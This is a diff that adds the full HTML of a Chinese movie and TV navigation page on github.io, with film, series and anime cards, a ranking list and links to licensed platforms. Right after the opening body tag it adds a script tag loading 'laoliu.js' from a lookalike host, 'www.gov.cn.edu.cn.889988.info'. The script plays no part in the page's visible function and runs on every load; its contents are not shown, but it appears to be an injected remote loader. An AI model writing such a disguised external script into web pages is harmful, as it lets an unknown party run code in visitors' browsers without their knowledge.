@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>皮皮电影网 - 好玩好逛的高清电影导航 | pipidianyingwang-h5.github.io</title>
+<meta name="description" content="皮皮电影网(https://pipidianyingwang-h5.github.io)是好逛不累的影视导航：最新电影、热播剧集、动漫番剧、皮皮热榜一站看，移动端自适应，片单指路正版平台，不提供盗版播放源。">
+<meta name="keywords" content="皮皮电影网,pipidianyingwang-h5.github.io,免费电影导航,最新电影,热播剧集,动漫番剧,皮皮热榜">
+<link rel="canonical" href="https://pipidianyingwang-h5.github.io/">
+<style>
+:root{
+  --lemon:#ffe14d;--peach:#ff9ec4;--mint:#7af0c8;--grape:#9b8cff;
+  --ink:#231a2e;--paper:#fff6fb;--card:#ffffff;--line:#ffe0ef;--dim:#7a6b80;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:
+  radial-gradient(120% 80% at 100% 0,rgba(155,140,255,.18),transparent 55%),
+  radial-gradient(90% 70% at 0 0,rgba(122,240,200,.18),transparent 50%),
+  var(--paper);
+  color:var(--ink);font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.3s}
+.wrap{max-width:1180px;margin:0 auto;padding:0 16px}
+
+/* header search */
+.head{position:sticky;top:0;z-index:50;background:rgba(255,246,251,.92);backdrop-filter:blur(8px);border-bottom:2px solid var(--line)}
+.head .wrap{display:flex;align-items:center;gap:14px;height:64px;flex-wrap:wrap}
+.logo{font-weight:900;font-size:1.4rem}
+.logo b{color:#ff5fa2}.logo i{color:#1fae7e;font-style:normal}
+.logo small{display:block;font-size:.66rem;color:var(--dim);font-weight:500}
+.search{flex:1;min-width:200px;display:flex;background:#fff;border:2px solid var(--line);border-radius:40px;overflow:hidden}
+.search input{flex:1;border:none;outline:none;padding:10px 18px;font-size:.9rem;background:transparent;color:var(--ink)}
+.search button{border:none;background:linear-gradient(135deg,var(--lemon),var(--peach));color:#3a1530;font-weight:800;padding:0 22px;cursor:pointer}
+.nav{display:flex;gap:14px}
+.nav a{font-size:.85rem;color:var(--dim);font-weight:600}
+.nav a:hover{color:#ff5fa2}
+.burger{display:none;background:#fff;border:2px solid var(--line);border-radius:10px;font-size:1.4rem;padding:2px 10px}
+
+/* bubble hero */
+.hero{padding:46px 0 30px;text-align:center;position:relative}
+.blob{position:absolute;border-radius:50%;filter:blur(2px);opacity:.5;z-index:0}
+.b1{width:160px;height:160px;background:var(--lemon);top:-20px;left:6%}
+.b2{width:120px;height:120px;background:var(--peach);top:30px;right:8%}
+.b3{width:90px;height:90px;background:var(--mint);bottom:-20px;left:40%}
+.hero-inner{position:relative;z-index:2}
+.pill{display:inline-block;background:#fff;border:2px solid var(--line);border-radius:30px;padding:5px 16px;font-size:.78rem;color:#ff5fa2;font-weight:700;margin-bottom:16px}
+.hero h1{font-size:2.8rem;font-weight:900;line-height:1.2}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#ff5fa2,#9b8cff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{max-width:600px;margin:14px auto 24px;color:var(--dim)}
+.hero-cta{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn{border:none;cursor:pointer;font-weight:800;font-size:.92rem;padding:12px 30px;border-radius:40px}
+.btn-pink{background:linear-gradient(135deg,var(--peach),#ff5fa2);color:#fff;box-shadow:0 10px 26px rgba(255,94,162,.35)}
+.btn-mint{background:#fff;border:2px solid var(--mint);color:#0f9b76}
+.btn:hover{transform:translateY(-3px)}
+
+/* ticker */
+.ticker{border-top:2px dashed var(--line);border-bottom:2px dashed var(--line);overflow:hidden;background:#fff}
+.ticker ul{display:flex;gap:30px;white-space:nowrap;padding:10px 0;width:max-content;animation:slide 24s linear infinite;list-style:none;font-size:.82rem;color:#a14b86}
+.ticker b{color:#1fae7e}
+@keyframes slide{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* sections */
+.sec{padding:44px 0}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.sec-head h2{font-size:1.35rem;display:flex;align-items:center;gap:10px}
+.sec-head h2::before{content:"";width:14px;height:14px;border-radius:50%;background:radial-gradient(circle,var(--lemon),var(--peach))}
+.sec-head a{font-size:.82rem;color:#1fae7e;font-weight:700}
+
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px}
+.chip{padding:6px 16px;border-radius:20px;background:#fff;border:2px solid var(--line);font-size:.8rem;color:var(--dim);cursor:pointer;font-weight:600}
+.chip.on,.chip:hover{background:linear-gradient(135deg,var(--lemon),var(--peach));color:#3a1530;border-color:transparent}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:18px}
+.card{background:var(--card);border:2px solid var(--line);border-radius:22px;overflow:hidden;transition:.35s;position:relative}
+.card:hover{transform:translateY(-8px) rotate(-.6deg);box-shadow:0 18px 40px rgba(255,94,162,.18);border-color:var(--peach)}
+.cover{height:210px;display:flex;align-items:center;justify-content:center;font-size:3rem;position:relative}
+.cover::after{content:"";position:absolute;inset:0;background:radial-gradient(120% 80% at 50% 0,rgba(255,255,255,.25),transparent 60%)}
+.c1{background:linear-gradient(135deg,#ffd1e8,#ff9ec4)} .c2{background:linear-gradient(135deg,#d7ffe9,#7af0c8)}
+.c3{background:linear-gradient(135deg,#fff3c4,#ffe14d)} .c4{background:linear-gradient(135deg,#e3ddff,#9b8cff)}
+.c5{background:linear-gradient(135deg,#d6f3ff,#5cc8ff)} .c6{background:linear-gradient(135deg,#ffe0c2,#ff9f5c)}
+.badge{position:absolute;top:10px;left:10px;z-index:2;background:#fff;border:2px solid var(--line);border-radius:20px;font-size:.66rem;font-weight:800;color:#ff5fa2;padding:2px 9px}
+.card .meta{padding:12px 14px}
+.card .meta h3{font-size:.95rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.card .meta p{font-size:.76rem;color:var(--dim);display:flex;justify-content:space-between;margin-top:4px}
+.card .meta b{color:#ff5fa2}
+
+/* rank + pop layout */
+.split{display:grid;grid-template-columns:1.5fr 1fr;gap:24px;align-items:start}
+.rank .row{display:flex;align-items:center;gap:14px;background:#fff;border:2px solid var(--line);border-radius:16px;padding:12px 16px;margin-bottom:10px}
+.rank .row:hover{border-color:var(--peach)}
+.no{width:30px;height:30px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#3a1530}
+.r1{background:linear-gradient(135deg,#ffe14d,#ff9ec4)} .r2{background:linear-gradient(135deg,#e3ddff,#9b8cff)} .r3{background:linear-gradient(135deg,#d7ffe9,#1fae7e);color:#fff}
+.r4,.r5{background:#fff;border:2px solid var(--line);color:#ff5fa2}
+.rank h4{flex:1;font-size:.92rem}
+.rank span{font-size:.78rem;color:#1fae7e;font-weight:700}
+
+.pop{background:#fff;border:2px solid var(--line);border-radius:22px;padding:18px}
+.pop h3{font-size:1.05rem;margin-bottom:12px;color:#ff5fa2}
+.pop ul{list-style:none}
+.pop li{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed var(--line);font-size:.85rem}
+.pop li:last-child{border-bottom:none}
+.pop .dot{width:10px;height:10px;border-radius:50%;background:var(--mint);flex-shrink:0}
+.pop li b{color:var(--ink)}
+
+/* channels */
+.chs{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px}
+.ch{background:#fff;border:2px solid var(--line);border-radius:18px;padding:16px}
+.ch h4{color:#ff5fa2;font-size:.98rem;margin-bottom:6px}
+.ch p{font-size:.78rem;color:var(--dim)}
+
+/* footer */
+.foot{margin-top:40px;background:#fff;border-top:2px solid var(--line);padding:38px 0 22px}
+.fg{display:grid;grid-template-columns:1.3fr 1fr 1fr 1fr;gap:30px;margin-bottom:22px}
+.fg h5{color:#ff5fa2;font-size:.95rem;margin-bottom:10px}
+.fg a{display:block;color:var(--dim);font-size:.8rem;margin-bottom:6px}
+.fg a:hover{color:#1fae7e}
+.fg p{color:var(--dim);font-size:.8rem;line-height:1.7}
+.copy{text-align:center;font-size:.74rem;color:#a98fb0;border-top:2px dashed var(--line);padding-top:16px;line-height:1.8}
+.copy a{color:#ff5fa2}
+
+.top{position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,var(--lemon),var(--peach));color:#3a1530;display:flex;align-items:center;justify-content:center;font-weight:900;cursor:pointer;opacity:0;visibility:hidden;transition:.3s;z-index:60}
+.top.show{opacity:1;visibility:visible}
+
+@media(max-width:860px){
+  .split{grid-template-columns:1fr}
+}
+@media(max-width:768px){
+  .nav{display:none;position:absolute;top:64px;left:0;right:0;background:#fff;border-bottom:2px solid var(--line);flex-direction:column;padding:14px 18px;gap:10px}
+  .nav.open{display:flex}
+  .burger{display:block}
+  .hero h1{font-size:2rem}
+  .grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+  .cover{height:180px}
+  .fg{grid-template-columns:1fr 1fr;gap:20px}
+}
+@media(max-width:460px){
+  .hero h1{font-size:1.6rem}
+  .hero-cta{flex-direction:column}.btn{width:100%}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .cover{height:150px;font-size:2.3rem}
+  .fg{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="head">
+  <div class="wrap">
+    <div class="logo">皮皮<b>电影</b><i>网</i><small>pipidianyingwang-h5.github.io</small></div>
+    <div class="search">
+      <input type="text" placeholder="搜电影 / 剧集 / 动漫：流浪地球、庆余年、鬼灭…">
+      <button onclick="alert('皮皮提示：演示站，内链用 #，正片去正版平台~')">皮皮搜</button>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#film">电影</a><a href="#tv">剧集</a><a href="#ani">动漫</a><a href="#rank">热榜</a><a href="#ch">正版</a>
+    </nav>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<div class="ticker" aria-hidden="true">
+  <ul>
+    <li>皮皮说：<b>最新电影</b> 已更新</li><li>庆余年4 <b>热播中</b></li><li>流浪地球3 <b>9.8分</b></li>
+    <li>鬼灭之刃 粤配 <b>上线</b></li><li>皮皮热榜每周一换</li><li>正版渠道已整理好</li>
+    <li>皮皮说：<b>最新电影</b> 已更新</li><li>庆余年4 <b>热播中</b></li><li>流浪地球3 <b>9.8分</b></li>
+    <li>鬼灭之刃 粤配 <b>上线</b></li><li>皮皮热榜每周一换</li><li>正版渠道已整理好</li>
+  </ul>
+</div>
+
+<section class="hero wrap">
+  <span class="blob b1"></span><span class="blob b2"></span><span class="blob b3"></span>
+  <div class="hero-inner">
+    <div class="pill">🍬 皮皮出品 · 好逛不累 · 移动端超顺手</div>
+    <h1>皮皮电影网<br><em>看片像吃糖，甜而不腻</em></h1>
+    <p>皮皮电影网（pipidianyingwang-h5.github.io）把最新电影、热播剧集、动漫番剧和皮皮热榜揉成一个软乎乎的片单站，指路正版平台，不塞盗版播放源。</p>
+    <div class="hero-cta">
+      <a href="#film" class="btn btn-pink">🍿 随便看看</a>
+      <a href="#rank" class="btn btn-mint">🏆 皮皮热榜</a>
+    </div>
+  </div>
+</section>
+
+<section class="sec wrap" id="film">
+  <div class="sec-head"><h2>最新电影</h2><a href="#">更多 ›</a></div>
+  <div class="chips"><span class="chip on">推荐</span><span class="chip">动作</span><span class="chip">科幻</span><span class="chip">喜剧</span><span class="chip">悬疑</span><span class="chip">合家欢</span></div>
+  <div class="grid">
+    <article class="card"><div class="cover c1"><span class="badge">皮皮推</span>🎬</div><div class="meta"><h3>流浪地球3</h3><p><span>科幻·2026</span><b>⭐9.8</b></p></div></article>
+    <article class="card"><div class="cover c2"><span class="badge">新片</span>🎬</div><div class="meta"><h3>怒火·重案</h3><p><span>动作·2021</span><b>⭐9.6</b></p></div></article>
+    <article class="card"><div class="cover c3">🎬</div><div class="meta"><h3>唐人街探案5</h3><p><span>悬疑·2026</span><b>⭐9.0</b></p></div></article>
+    <article class="card"><div class="cover c4">🎬</div><div class="meta"><h3>封神演义·终章</h3><p><span>奇幻·2026</span><b>⭐9.5</b></p></div></article>
+    <article class="card"><div class="cover c5">🎬</div><div class="meta"><h3>蜘蛛侠：纵横宇宙3</h3><p><span>动画·2026</span><b>⭐9.4</b></p></div></article>
+    <article class="card"><div class="cover c6">🎬</div><div class="meta"><h3>饭戏攻心</h3><p><span>喜剧·2022</span><b>⭐8.9</b></p></div></article>
+  </div>
+</section>
+
+<section class="sec wrap" id="tv" style="background:rgba(255,158,196,.06)">
+  <div class="sec-head"><h2>热播剧集</h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="card"><div class="cover c4"><span class="badge">热播</span>📺</div><div class="meta"><h3>庆余年4</h3><p><span>古装·32集</span><b>⭐9.7</b></p></div></article>
+    <article class="card"><div class="cover c1">📺</div><div class="meta"><h3>三体·黑暗森林</h3><p><span>科幻·12集</span><b>⭐9.5</b></p></div></article>
+    <article class="card"><div class="cover c2">📺</div><div class="meta"><h3>狂飙2</h3><p><span>犯罪·20集</span><b>⭐9.3</b></p></div></article>
+    <article class="card"><div class="cover c3">📺</div><div class="meta"><h3>新闻女王</h3><p><span>职场·26集</span><b>⭐9.7</b></p></div></article>
+  </div>
+</section>
+
+<section class="sec wrap" id="ani">
+  <div class="sec-head"><h2>动漫番剧</h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="card"><div class="cover c2"><span class="badge">粤配</span>🌸</div><div class="meta"><h3>鬼灭之刃·无限列车</h3><p><span>热血·粤配</span><b>⭐9.7</b></p></div></article>
+    <article class="card"><div class="cover c4">🌸</div><div class="meta"><h3>斗破苍穹·年番</h3><p><span>国漫·45集</span><b>⭐9.4</b></p></div></article>
+    <article class="card"><div class="cover c3">🌸</div><div class="meta"><h3>咒术回战</h3><p><span>战斗·粤配</span><b>⭐9.4</b></p></div></article>
+    <article class="card"><div class="cover c5">🌸</div><div class="meta"><h3>凡人修仙传</h3><p><span>仙侠·28集</span><b>⭐9.2</b></p></div></article>
+  </div>
+</section>
+
+<section class="sec wrap" id="rank">
+  <div class="sec-head"><h2>皮皮热榜 2026</h2></div>
+  <div class="split">
+    <div class="rank">
+      <div class="row"><span class="no r1">1</span><h4>流浪地球3</h4><span>⭐9.8 科幻神作</span></div>
+      <div class="row"><span class="no r2">2</span><h4>庆余年4</h4><span>⭐9.7 古装权谋</span></div>
+      <div class="row"><span class="no r3">3</span><h4>新闻女王</h4><span>⭐9.7 TVB爆款</span></div>
+      <div class="row"><span class="no r4">4</span><h4>怒火·重案</h4><span>⭐9.6 港产动作</span></div>
+      <div class="row"><span class="no r5">5</span><h4>鬼灭之刃·无限列车</h4><span>⭐9.7 粤配动漫</span></div>
+    </div>
+    <aside class="pop">
+      <h3>🍭 皮皮在看啥</h3>
+      <ul>
+        <li><span class="dot"></span><b>合家欢</b>：哆啦A梦剧场版（粤配）</li>
+        <li><span class="dot"></span><b>周末爽片</b>：速度与激情12</li>
+        <li><span class="dot"></span><b>下饭剧</b>：溏心风暴之家好月圆</li>
+        <li><span class="dot"></span><b>悬疑控</b>：唐人街探案系列</li>
+        <li><span class="dot"></span><b>国漫党</b>：完美世界 / 灵笼2</li>
+      </ul>
+    </aside>
+  </div>
+</section>
+
+<section class="sec wrap" id="ch" style="background:rgba(122,240,200,.06)">
+  <div class="sec-head"><h2>正版看片渠道</h2></div>
+  <div class="chs">
+    <div class="ch"><h4>1905 电影网</h4><p>国产/合拍片正版片库，经典老片免费。</p></div>
+    <div class="ch"><h4>哔哩哔哩</h4><p>国漫、粤配动漫、纪录片免费专区。</p></div>
+    <div class="ch"><h4>爱奇艺 / 腾讯视频</h4><p>正规平台免费栏目与粤语音轨片源。</p></div>
+    <div class="ch"><h4>MyTV SUPER / TVB</h4><p>TVB 港剧、港综官方正版点播。</p></div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h5>皮皮电影网</h5>
+        <p>皮皮电影网（pipidianyingwang-h5.github.io）是好逛的影视片单导航：电影、剧集、动漫、热榜一站看，萌系界面+移动端自适应，正片走正版平台。</p>
+      </div>
+      <div><h5>片单</h5><a href="#film">最新电影</a><a href="#tv">热播剧集</a><a href="#ani">动漫番剧</a><a href="#rank">皮皮热榜</a></div>
+      <div><h5>类型</h5><a href="#">动作</a><a href="#">科幻</a><a href="#">喜剧</a><a href="#">悬疑</a></div>
+      <div><h5>站点</h5><a href="https://pipidianyingwang-h5.github.io">pipidianyingwang-h5.github.io</a><a href="#">内容声明</a><a href="#">免责声明</a></div>
+    </div>
+    <div class="copy">
+      © 2026 皮皮电影网 | 看片像吃糖，甜而不腻 | <a href="https://pipidianyingwang-h5.github.io">pipidianyingwang-h5.github.io</a><br>
+      本站为影视导航/片单站，不提供侵权播放与下载，资源以正版平台为准。
+    </div>
+  </div>
+</footer>
+
+<div class="top" id="top">↑</div>
+
+<script>
+document.getElementById('burger').onclick=()=>document.getElementById('nav').classList.toggle('open');
+addEventListener('scroll',()=>document.getElementById('top').classList.toggle('show',scrollY>320));
+document.getElementById('top').onclick=()=>scrollTo({top:0,behavior:'smooth'});
+document.querySelectorAll('.chip').forEach(c=>c.onclick=function(){document.querySelectorAll('.chip').forEach(x=>x.classList.remove('on'));this.classList.add('on');});
+document.querySelectorAll('#nav a').forEach(a=>a.onclick=()=>document.getElementById('nav').classList.remove('open'));
+</script>
+</body>
+</html>
